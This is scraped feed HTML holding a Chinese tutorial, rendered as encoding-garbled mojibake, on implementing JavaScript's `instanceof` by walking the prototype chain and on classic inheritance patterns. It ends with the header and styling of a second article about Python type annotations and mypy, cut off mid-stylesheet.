                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">æ‰‹å†™ instanceofï¼šæ·±å…¥ç†è§£ JavaScript åŸå‹ä¸ç»§æ‰¿æœºåˆ¶</h2>
<p>åœ¨ JavaScript çš„é¢å‘å¯¹è±¡ç¼–ç¨‹ï¼ˆOOPï¼‰ä½“ç³»ä¸­ï¼Œ<code>instanceof</code> æ˜¯ä¸€ä¸ªéå¸¸å…³é”®çš„è¿ç®—ç¬¦ã€‚å®ƒç”¨äºåˆ¤æ–­æŸä¸ªå¯¹è±¡æ˜¯å¦æ˜¯ç‰¹å®šæ„é€ å‡½æ•°çš„å®ä¾‹ï¼Œå…¶æœ¬è´¨æ˜¯æ£€æŸ¥è¯¥å¯¹è±¡çš„åŸå‹é“¾ä¸Šæ˜¯å¦å­˜åœ¨æŒ‡å®šæ„é€ å‡½æ•°çš„ <code>prototype</code> å¯¹è±¡ã€‚ç„¶è€Œï¼Œåœ¨å¤§å‹é¡¹ç›®ã€å¤šäººåä½œå¼€å‘åœºæ™¯ä¸‹ï¼Œå¼€å‘è€…å¸¸å¸¸å¯¹å¯¹è±¡çš„æ¥æºå’Œç»§æ‰¿å…³ç³»æ„Ÿåˆ°å›°æƒ‘ã€‚æ­¤æ—¶ï¼Œç†è§£å¹¶æŒæ¡ <code>instanceof</code> çš„åº•å±‚åŸç†ï¼Œç”šè‡³æ‰‹å†™å…¶å®ç°é€»è¾‘ï¼Œå°±æ˜¾å¾—å°¤ä¸ºé‡è¦ã€‚</p>
<p>æœ¬æ–‡å°†å›´ç»•â€œæ‰‹å†™ instanceofâ€è¿™ä¸€ä¸»é¢˜ï¼Œä»åŸå‹ä¸åŸå‹é“¾çš„åŸºæœ¬æ¦‚å¿µå‡ºå‘ï¼Œé€æ­¥å‰–æ JavaScript ä¸­çš„ç»§æ‰¿æ–¹å¼ï¼Œå¹¶æœ€ç»ˆå®ç°ä¸€ä¸ªç¬¦åˆè§„èŒƒçš„ <code>isInstanceOf</code> å‡½æ•°ã€‚</p>
<hr/>
<h3 data-id="heading-1">ä¸€ã€åŸå‹ä¸åŸå‹é“¾ï¼šJavaScript OOP çš„åŸºçŸ³</h3>
<p>JavaScript å¹¶ä¸åƒ Java æˆ– C++ é‚£æ ·æ‹¥æœ‰â€œç±»â€çš„è¯­æ³•ï¼ˆES6 ä¹‹å‰çš„ç‰ˆæœ¬ï¼‰ï¼Œè€Œæ˜¯åŸºäº<strong>åŸå‹ï¼ˆPrototypeï¼‰</strong> å®ç°é¢å‘å¯¹è±¡ç¼–ç¨‹ã€‚æ¯ä¸ªå‡½æ•°éƒ½æœ‰ä¸€ä¸ª <code>prototype</code> å±æ€§ï¼ŒæŒ‡å‘ä¸€ä¸ªå¯¹è±¡ï¼›è€Œæ¯ä¸ªå¯¹è±¡ï¼ˆé™¤ <code>null</code> å¤–ï¼‰éƒ½æœ‰ä¸€ä¸ªå†…éƒ¨å±æ€§ <code>[[Prototype]]</code>ï¼Œé€šå¸¸é€šè¿‡ <code>__proto__</code> è®¿é—®ã€‚</p>
<p>å½“ä½¿ç”¨ <code>new</code> å…³é”®å­—åˆ›å»ºå¯¹è±¡æ—¶ï¼Œæ–°å¯¹è±¡çš„ <code>[[Prototype]]</code> ä¼šè¢«è®¾ç½®ä¸ºæ„é€ å‡½æ•°çš„ <code>prototype</code>ã€‚ä¾‹å¦‚ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Animal</span>(<span class="hljs-params"/>) {}
<span class="hljs-keyword">const</span> dog = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Animal</span>();
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(dog.<span class="hljs-property">__proto__</span> === <span class="hljs-title class_">Animal</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>); <span class="hljs-comment">// true</span>
</code></pre>
<p>è¿™ç§é“¾æ¥å…³ç³»å½¢æˆäº†æ‰€è°“çš„<strong>åŸå‹é“¾</strong>ã€‚å½“è®¿é—®ä¸€ä¸ªå¯¹è±¡çš„å±æ€§æˆ–æ–¹æ³•æ—¶ï¼Œå¦‚æœè‡ªèº«æ²¡æœ‰ï¼ŒJavaScript å¼•æ“ä¼šæ²¿ç€åŸå‹é“¾å‘ä¸ŠæŸ¥æ‰¾ï¼Œç›´åˆ°æ‰¾åˆ°è¯¥å±æ€§æˆ–åˆ°è¾¾é“¾çš„é¡¶ç«¯ï¼ˆå³ <code>Object.prototype</code>ï¼Œå…¶ <code>__proto__</code> ä¸º <code>null</code>ï¼‰ã€‚</p>
<hr/>
<h3 data-id="heading-2">äºŒã€instanceof çš„ä½œç”¨ä¸å±€é™</h3>
<p><code>instanceof</code> è¿ç®—ç¬¦çš„è¯­æ³•ä¸ºï¼š</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-tag">A</span> instanceof <span class="hljs-selector-tag">B</span>
</code></pre>
<p>å…¶å«ä¹‰æ˜¯ï¼š<strong>A çš„åŸå‹é“¾ä¸Šæ˜¯å¦åŒ…å« B.prototype</strong>ã€‚è¿™åœ¨åˆ¤æ–­å¯¹è±¡â€œè¡€ç¼˜å…³ç³»â€æ—¶éå¸¸æœ‰ç”¨ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> arr = [];
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Array</span>);  <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Object</span>); <span class="hljs-comment">// true</span>
</code></pre>
<p>ä½† <code>instanceof</code> ä¹Ÿæœ‰å±€é™æ€§ï¼š</p>
<ul>
<li>åœ¨è·¨ iframe æˆ–ä¸åŒå…¨å±€ç¯å¢ƒï¼ˆå¦‚ Web Workerï¼‰ä¸­ï¼Œç”±äºæ„é€ å‡½æ•°å¼•ç”¨ä¸åŒï¼Œå¯èƒ½å¯¼è‡´è¯¯åˆ¤ã€‚</li>
<li>å®ƒä¾èµ–äºåŸå‹é“¾ï¼Œè‹¥åŸå‹è¢«ç¯¡æ”¹ï¼Œç»“æœå¯èƒ½ä¸å¯é ã€‚</li>
</ul>
<p>å› æ­¤ï¼Œç†è§£å…¶å†…éƒ¨æœºåˆ¶ï¼Œæœ‰åŠ©äºæˆ‘ä»¬åœ¨å¿…è¦æ—¶è‡ªå®šä¹‰æ›´å¯é çš„ç±»å‹åˆ¤æ–­é€»è¾‘ã€‚</p>
<hr/>
<h3 data-id="heading-3">ä¸‰ã€æ‰‹å†™ instanceofï¼šæ¨¡æ‹ŸåŸå‹é“¾æŸ¥æ‰¾</h3>
<p>æ ¹æ® <code>instanceof</code> çš„å®šä¹‰ï¼Œæˆ‘ä»¬å¯ä»¥æ‰‹åŠ¨å®ç°ä¸€ä¸ª <code>isInstanceOf</code> å‡½æ•°ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">function isInstanceOf(left, right) {
    let <span class="hljs-attr">proto</span> = left.__proto__<span class="hljs-comment">;</span>
    while (proto) {
        if (<span class="hljs-attr">proto</span> === right.prototype) {
            return true<span class="hljs-comment">;</span>
        }
        <span class="hljs-attr">proto</span> = proto.__proto__<span class="hljs-comment">;</span>
    }
    return false<span class="hljs-comment">;</span>
}
</code></pre>
<p>è¯¥å‡½æ•°ä» <code>left</code> å¯¹è±¡çš„ <code>__proto__</code> å¼€å§‹ï¼Œé€çº§å‘ä¸Šéå†åŸå‹é“¾ï¼Œè‹¥åœ¨æŸä¸€å±‚å‘ç°ä¸ <code>right.prototype</code> å¼•ç”¨ç›¸ç­‰ï¼Œåˆ™è¿”å› <code>true</code>ï¼›è‹¥éå†åˆ° <code>null</code> ä»æœªæ‰¾åˆ°ï¼Œåˆ™è¿”å› <code>false</code>ã€‚</p>
<h4 data-id="heading-4">ç¤ºä¾‹éªŒè¯ï¼š</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Animal</span>(<span class="hljs-params"/>) {}
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Dog</span>(<span class="hljs-params"/>) {}
<span class="hljs-title class_">Dog</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Animal</span>();

<span class="hljs-keyword">const</span> dog = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Dog</span>();

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">isInstanceOf</span>(dog, <span class="hljs-title class_">Dog</span>));     <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">isInstanceOf</span>(dog, <span class="hljs-title class_">Animal</span>));  <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">isInstanceOf</span>(dog, <span class="hljs-title class_">Object</span>));  <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">isInstanceOf</span>(dog, <span class="hljs-title class_">Array</span>));   <span class="hljs-comment">// false</span>
</code></pre>
<p>ç»“æœä¸åŸç”Ÿ <code>instanceof</code> å®Œå…¨ä¸€è‡´ï¼Œè¯´æ˜æˆ‘ä»¬çš„å®ç°æ˜¯æ­£ç¡®çš„ã€‚</p>
<blockquote>
<p>æ³¨æ„ï¼šç°ä»£ JavaScript æ¨èä½¿ç”¨ <code>Object.getPrototypeOf(obj)</code> æ›¿ä»£ <code>obj.__proto__</code>ï¼Œä»¥æé«˜ä»£ç çš„è§„èŒƒæ€§å’Œå…¼å®¹æ€§ã€‚å› æ­¤æ›´å¥å£®çš„å†™æ³•æ˜¯ï¼š</p>
</blockquote>
<pre><code class="hljs language-ini" lang="ini">function isInstanceOf(left, right) {
    let <span class="hljs-attr">proto</span> = Object.getPrototypeOf(left)<span class="hljs-comment">;</span>
    while (proto) {
        if (<span class="hljs-attr">proto</span> === right.prototype) return <span class="hljs-literal">true</span><span class="hljs-comment">;</span>
        <span class="hljs-attr">proto</span> = Object.getPrototypeOf(proto)<span class="hljs-comment">;</span>
    }
    return false<span class="hljs-comment">;</span>
}
</code></pre>
<hr/>
<h3 data-id="heading-5">å››ã€JavaScript ä¸­çš„ç»§æ‰¿æ–¹å¼</h3>
<p>è¦çœŸæ­£ç†è§£ <code>instanceof</code> çš„æ„ä¹‰ï¼Œè¿˜éœ€äº†è§£ JavaScript ä¸­å¸¸è§çš„ç»§æ‰¿æ¨¡å¼ã€‚å› ä¸º <code>instanceof</code> åˆ¤æ–­çš„æ˜¯â€œåŸå‹ç»§æ‰¿å…³ç³»â€ï¼Œè€Œéâ€œå±æ€§æ‹·è´â€ã€‚</p>
<h4 data-id="heading-6">1. æ„é€ å‡½æ•°ç»‘å®šï¼ˆå€Ÿç”¨æ„é€ å‡½æ•°ï¼‰</h4>
<p>é€šè¿‡ <code>call</code> æˆ– <code>apply</code> è°ƒç”¨çˆ¶ç±»æ„é€ å‡½æ•°ï¼Œå°†å±æ€§å¤åˆ¶åˆ°å­ç±»å®ä¾‹ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Animal</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">species</span> = <span class="hljs-string">'åŠ¨ç‰©'</span>;
}
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Cat</span>(<span class="hljs-params">name</span>) {
    <span class="hljs-title class_">Animal</span>.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>); <span class="hljs-comment">// ç»§æ‰¿å±æ€§</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
}
</code></pre>
<p><strong>ä¼˜ç‚¹</strong>ï¼šå¯ä¼ å‚ï¼Œé¿å…å¼•ç”¨å…±äº«ã€‚<br/>
<strong>ç¼ºç‚¹</strong>ï¼šæ— æ³•ç»§æ‰¿çˆ¶ç±»åŸå‹ä¸Šçš„æ–¹æ³•ï¼Œ<code>cat instanceof Animal</code> ä¸º <code>false</code>ã€‚</p>
<h4 data-id="heading-7">2. åŸå‹é“¾ç»§æ‰¿ï¼ˆprototype æ¨¡å¼ï¼‰</h4>
<p>å°†çˆ¶ç±»çš„å®ä¾‹è®¾ä¸ºå­ç±»çš„åŸå‹ï¼š</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">Cat.prototype</span> = new Animal()<span class="hljs-comment">;</span>
<span class="hljs-attr">Cat.prototype.constructor</span> = Cat<span class="hljs-comment">; // ä¿®æ­£ constructor</span>
</code></pre>
<p>æ­¤æ—¶ï¼Œ<code>new Cat()</code> çš„åŸå‹é“¾åŒ…å« <code>Animal.prototype</code>ï¼Œå› æ­¤ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> cat = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>(<span class="hljs-string">'å°é»‘'</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cat <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Animal</span>); <span class="hljs-comment">// true</span>
</code></pre>
<p><strong>ç¼ºç‚¹</strong>ï¼šæ— æ³•å‘çˆ¶ç±»æ„é€ å‡½æ•°ä¼ å‚ï¼›æ‰€æœ‰å­ç±»å®ä¾‹å…±äº«çˆ¶ç±»å®ä¾‹çš„å±æ€§ï¼ˆè‹¥çˆ¶ç±»æœ‰å¼•ç”¨ç±»å‹å±æ€§ï¼Œä¼šç›¸äº’å½±å“ï¼‰ã€‚</p>
<h4 data-id="heading-8">3. ç»„åˆç»§æ‰¿ï¼ˆæ¨èï¼‰</h4>
<p>ç»“åˆä¸Šè¿°ä¸¤ç§æ–¹å¼ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">function Cat(name) {
    Animal.call(this)<span class="hljs-comment">; // ç»§æ‰¿å±æ€§</span>
    <span class="hljs-attr">this.name</span> = name<span class="hljs-comment">;</span>
}
<span class="hljs-attr">Cat.prototype</span> = new Animal()<span class="hljs-comment">; // ç»§æ‰¿æ–¹æ³•</span>
<span class="hljs-attr">Cat.prototype.constructor</span> = Cat<span class="hljs-comment">;</span>
</code></pre>
<p>æ—¢å¯ä¼ å‚ï¼Œåˆèƒ½æ­£ç¡®å»ºç«‹åŸå‹é“¾ï¼Œä½¿å¾— <code>instanceof</code> åˆ¤æ–­æœ‰æ•ˆã€‚</p>
<h4 data-id="heading-9">4. ç›´æ¥ç»§æ‰¿ prototypeï¼ˆéœ€è°¨æ…ï¼‰</h4>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">Cat.prototype</span> = Animal.prototype<span class="hljs-comment">;</span>
</code></pre>
<p>è™½ç„¶èŠ‚çœå†…å­˜ï¼Œä½†ä¼šå¯¼è‡´ <code>Cat.prototype.constructor</code> æŒ‡å‘ <code>Animal</code>ï¼Œä¸”ä¿®æ”¹ <code>Cat.prototype</code> ä¼šç›´æ¥å½±å“ <code>Animal.prototype</code>ï¼Œç ´åå°è£…æ€§ã€‚</p>
<hr/>
<h3 data-id="heading-10">äº”ã€ä¸ºä»€ä¹ˆ instanceof åœ¨å¤§å‹é¡¹ç›®ä¸­å¾ˆé‡è¦ï¼Ÿ</h3>
<p>åœ¨å¤æ‚ç³»ç»Ÿä¸­ï¼Œå¯¹è±¡å¯èƒ½æ¥è‡ªå¤šä¸ªæ¨¡å—ã€ç¬¬ä¸‰æ–¹åº“ï¼Œç”šè‡³åŠ¨æ€ç”Ÿæˆã€‚å¼€å‘è€…å¾€å¾€ä¸æ¸…æ¥šæŸä¸ªå¯¹è±¡åˆ°åº•â€œæ˜¯è°çš„å­©å­â€ã€‚æ­¤æ—¶ï¼š</p>
<ul>
<li>ä½¿ç”¨ <code>typeof</code> åªèƒ½åŒºåˆ†åŸºæœ¬ç±»å‹ï¼›</li>
<li>ä½¿ç”¨ <code>Object.prototype.toString.call()</code> è™½å¯è¯†åˆ«å†…ç½®ç±»å‹ï¼Œä½†å¯¹è‡ªå®šä¹‰ç±»æ— èƒ½ä¸ºåŠ›ï¼›</li>
<li><strong><code>instanceof</code> æä¾›äº†åŸºäºâ€œç»§æ‰¿å…³ç³»â€çš„è¯­ä¹‰åŒ–åˆ¤æ–­</strong>ï¼Œæ˜¯ç±»å‹å®‰å…¨çš„é‡è¦ä¿éšœã€‚</li>
</ul>
<p>ä¾‹å¦‚ï¼š</p>
<pre><code class="hljs language-scss" lang="scss">function <span class="hljs-built_in">handleEntity</span>(entity) {
    if (entity instanceof User) {
        entity<span class="hljs-selector-class">.login</span>();
    } else if (entity instanceof Product) {
        entity<span class="hljs-selector-class">.display</span>();
    }
}
</code></pre>
<p>è¿™ç§åŸºäºç±»å‹çš„åˆ†å‘é€»è¾‘ï¼Œä¾èµ–äºæ­£ç¡®çš„åŸå‹é“¾è®¾è®¡å’Œ <code>instanceof</code> åˆ¤æ–­ã€‚</p>
<hr/>
<h3 data-id="heading-11">å…­ã€æ€»ç»“</h3>
<p><code>instanceof</code> ä¸ä»…ä»…æ˜¯ä¸€ä¸ªè¿ç®—ç¬¦ï¼Œå®ƒä½“ç°äº† JavaScript åŸå‹ç»§æ‰¿çš„æ ¸å¿ƒæ€æƒ³ã€‚é€šè¿‡æ‰‹å†™ <code>isInstanceOf</code>ï¼Œæˆ‘ä»¬ä¸ä»…æŒæ¡äº†å…¶å·¥ä½œåŸç†ï¼Œä¹ŸåŠ æ·±äº†å¯¹åŸå‹é“¾çš„ç†è§£ã€‚åœ¨å®é™…å¼€å‘ä¸­ï¼Œåˆç†ä½¿ç”¨ç»§æ‰¿æ¨¡å¼ï¼ˆå¦‚ç»„åˆç»§æ‰¿ï¼‰ï¼Œé…åˆ <code>instanceof</code> è¿›è¡Œç±»å‹åˆ¤æ–­ï¼Œèƒ½å¤Ÿæ˜¾è‘—æå‡ä»£ç çš„å¯ç»´æŠ¤æ€§ä¸å¥å£®æ€§ã€‚</p>
<p>åœ¨ ES6+ æ—¶ä»£ï¼Œè™½ç„¶ <code>class</code> è¯­æ³•ç³–è®©ç»§æ‰¿çœ‹èµ·æ¥æ›´â€œä¼ ç»Ÿâ€ï¼Œä½†å…¶åº•å±‚ä¾ç„¶æ˜¯åŸºäºåŸå‹é“¾ã€‚å› æ­¤ï¼Œæ— è®ºè¯­æ³•å¦‚ä½•æ¼”è¿›ï¼Œ<strong>ç†è§£åŸå‹æœºåˆ¶å§‹ç»ˆæ˜¯æŒæ¡ JavaScript é¢å‘å¯¹è±¡ç¼–ç¨‹çš„å…³é”®</strong>ã€‚</p>
<p>æ­£å¦‚é‚£å¥è€è¯ï¼šâ€œçŸ¥å…¶ç„¶ï¼Œæ›´è¦çŸ¥å…¶æ‰€ä»¥ç„¶ã€‚â€â€”â€”æ‰‹å†™ <code>instanceof</code>ï¼Œæ­£æ˜¯é€šå¾€è¿™ä¸€å¢ƒç•Œçš„ä¸€æ¡æ·å¾„ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[åˆ«å†è£¸å¥”å†™Pythonäº†ï¼ç±»å‹æ³¨è§£+mypyè®©ä½ ä»£ç å¥å£®å¦‚é’¢é“ä¾ ]]></title>    <link>https://juejin.cn/post/7580740782933458986</link>    <guid>https://juejin.cn/post/7580740782933458986</guid>    <pubDate>2025-12-08T05:45:51.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580740782933458986" data-draft-id="7581081334850093097" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="åˆ«å†è£¸å¥”å†™Pythonäº†ï¼ç±»å‹æ³¨è§£+mypyè®©ä½ ä»£ç å¥å£®å¦‚é’¢é“ä¾ "/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2025-12-08T05:45:51.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç”¨æˆ·6854537597769"/> <meta itemprop="url" content="https://juejin.cn/user/1601315325621550"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            åˆ«å†è£¸å¥”å†™Pythonäº†ï¼ç±»å‹æ³¨è§£+mypyè®©ä½ ä»£ç å¥å£®å¦‚é’¢é“ä¾ 
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1601315325621550/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç”¨æˆ·6854537597769
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T05:45:51.000Z" title="Mon Dec 08 2025 05:45:51 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol 